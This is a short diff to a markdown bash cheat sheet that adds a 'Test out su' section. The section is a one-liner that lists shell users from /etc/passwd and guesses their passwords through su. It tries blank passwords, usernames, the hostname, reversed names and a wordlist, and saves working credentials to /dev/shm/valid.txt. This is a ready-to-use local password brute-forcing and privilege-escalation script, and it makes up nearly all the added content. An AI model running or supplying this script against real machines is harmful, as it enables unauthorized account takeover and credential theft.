@@ -165,3 +165,9 @@ Print specific lines.
 ```bash
 sed -n '2,15 p' log.txt
 ```
+
+#### Test out su
+
+```bash
+users=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1); sucheck(){ sucheck=$(echo "$2" | timeout 1 su $user -c whoami 2>/dev/null); if [ "$sucheck" ]; then echo "  You can login as $user using password: $2" && echo "$1:$2" >> /dev/shm/valid.txt; fi }; printf "%s\n" "$users" | while read user; do sucheck "$user" ""; sucheck "$user" "$user"; sucheck "$user" "$hostname"; sucheck "$user" "$(echo $user | rev 2>/dev/null)"; if [ -f "passwords.txt" ]; then while IFS=' ' read -r guess; do sucheck "$user" "$guess"; sleep 0.01; done < "passwords.txt"; fi; if [ -f "$1" ]; then while IFS=' ' read -r guess; do sucheck "$user" "$guess"; sleep 0.01; done < "$1"; fi; done
+```
